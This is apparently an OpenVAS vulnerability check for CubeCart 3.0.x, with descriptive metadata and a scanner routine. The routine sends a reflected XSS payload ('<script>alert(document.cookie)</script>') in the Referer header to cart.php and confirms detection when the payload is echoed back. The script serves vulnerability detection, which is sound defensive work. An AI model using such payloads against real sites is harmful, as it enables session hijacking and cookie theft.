###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cubecart_mult_vuln.nasl 5841 2017-04-03 12:46:41Z cfi $
#
# CubeCart Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "CubeCart version 3.0.x through 3.0.20";
tag_insight = "Inputs passed via multiple parameters to 'index.php', 'cart.php' and Admin
  Interface is not properly sanitised before it is returned to the user.";
tag_solution = "Upgrade to CubeCart version 5.0 or later,
  For updates refer to http://www.cubecart.com";
tag_summary = "This host is installed with CubeCart and is prone to multiple
  vulnerabilities.";

CPE = "cpe:/a:cubecart:cubecart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803090");
  script_version("$Revision: 5841 $");
  script_bugtraq_id(57031);
  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:46:41 +0200 (Mon, 03 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-12-25 15:26:41 +0530 (Tue, 25 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("CubeCart Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Dec/128");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/119041");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Dec/233");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Dec/234");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_cubecart_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cubecart/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
ccPort = 0;
url = "";
dir = "";
ccReq = "";
ccRes = "";

if(!ccPort = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port: ccPort))exit(0);

host = http_host_name(port:ccPort);

## Construct XSS attack request
url = dir + '/cart.php?act=cart';
ccReq = string('GET ', url, ' HTTP/1.1\r\n',
               'Host: ', host, '\r\n',
               'User-Agent: ', OPENVAS_HTTP_USER_AGENT, '\r\n',
               'Referer: "/><script>alert(document.cookie)</script>\r\n\r\n');

## Send the attack request
ccRes = http_keepalive_send_recv(port:ccPort, data:ccReq);

## Confirm exploit worked properly or not
if(ccRes && ccRes =~ "HTTP/1\.[0-9]+ 200" &&
   "Powered by CubeCart" >< ccRes && "Devellion Limited" >< ccRes &&
   "><script>alert(document.cookie)</script>" >< ccRes){
  security_message(port:ccPort);
}